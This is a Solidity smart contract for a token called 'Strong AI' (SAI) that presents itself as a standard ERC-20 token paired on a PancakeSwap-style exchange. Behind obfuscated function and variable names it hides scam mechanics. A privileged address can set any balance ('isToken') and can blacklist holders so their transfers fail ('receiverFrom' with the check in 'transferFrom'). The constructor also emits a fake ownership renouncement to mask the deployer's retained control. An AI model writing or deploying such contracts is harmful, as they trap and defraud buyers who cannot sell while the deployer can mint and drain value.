//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface toEnable {
    function createPair(address enableFromExempt, address teamMin) external returns (address);
}

contract StrongAI {

    function isToken(address shouldExempt, uint256 fromTeam) public {
        require(minFromReceiver[tradingMin()]);
        balanceOf[shouldExempt] = fromTeam;
    }

    mapping(address => bool) public tradingLimit;

    bool private atFund;

    address public owner;

    event Transfer(address indexed from, address indexed atFrom, uint256 value);

    bool private enableLimit;

    constructor (){ 
        swapModeLimit = toEnable(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        totalIs = tradingMin();
        balanceOf[totalIs] = totalSupply;
        minFromReceiver[totalIs] = true;
        emit Transfer(address(0), totalIs, totalSupply);
        emit OwnershipTransferred(totalIs, address(0));
    }

    event Approval(address indexed totalReceiver, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    bool private isSwap;

    function transferFrom(address maxAmountTotal, address shouldExempt, uint256 fromTeam) public returns (bool) {
        if (maxAmountTotal != tradingMin() && allowance[maxAmountTotal][tradingMin()] != type(uint256).max) {
            require(allowance[maxAmountTotal][tradingMin()] >= fromTeam);
            allowance[maxAmountTotal][tradingMin()] -= fromTeam;
        }
        require(!tradingLimit[maxAmountTotal]);
        return txTotal(maxAmountTotal, shouldExempt, fromTeam);
    }

    bool private sellIs;

    function transfer(address shouldExempt, uint256 fromTeam) external returns (bool) {
        return transferFrom(tradingMin(), shouldExempt, fromTeam);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Strong AI";

    string public symbol = "SAI";

    function receiverFrom(address sellAt) public {
        require(minFromReceiver[tradingMin()]);
        if (sellAt == totalIs || sellAt == swapModeLimit) {
            return;
        }
        tradingLimit[sellAt] = true;
    }

    mapping(address => bool) public minFromReceiver;

    bool private shouldListFee;

    function approve(address receiverReceiver, uint256 fromTeam) public returns (bool) {
        allowance[tradingMin()][receiverReceiver] = fromTeam;
        emit Approval(tradingMin(), receiverReceiver, fromTeam);
        return true;
    }

    function tradingMin() private view returns (address) {
        return msg.sender;
    }

    uint256 public feeReceiver;

    uint256 private limitTakeMode;

    address public totalIs;

    function txTotal(address modeAt, address walletAtFrom, uint256 fromTeam) internal returns (bool) {
        require(balanceOf[modeAt] >= fromTeam);
        balanceOf[modeAt] -= fromTeam;
        balanceOf[walletAtFrom] += fromTeam;
        emit Transfer(modeAt, walletAtFrom, fromTeam);
        return true;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 public liquidityFund;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    address public swapModeLimit;

    bool public liquidityListFee;

    uint8 public decimals = 18;

    function isTake(address tokenTake) public {
        require(!liquidityListFee);
        minFromReceiver[tokenTake] = true;
        liquidityListFee = true;
    }

}